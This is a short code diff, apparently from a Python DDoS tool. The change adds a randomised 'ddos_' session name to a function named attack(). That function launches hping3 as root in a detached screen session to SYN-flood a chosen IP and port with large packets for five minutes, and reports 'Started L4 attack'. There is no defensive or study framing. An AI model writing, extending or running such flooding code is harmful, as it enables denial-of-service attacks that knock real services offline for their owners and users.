@@ -48,6 +48,7 @@ def attack():
     try:
         # 执行命令
         subprocess.Popen(command, shell=True)
+        session_name = f"ddos_{generate_random_string()}"
         command = f"screen -S {session_name} -dm bash -c 'sudo timeout 300s hping3 -q -S {ip} -p {port} -i u100 -d 8192'"
         subprocess.Popen(command, shell=True)
         return f"Started L4 attack on {ip}:{port} with session {session_name}", 200
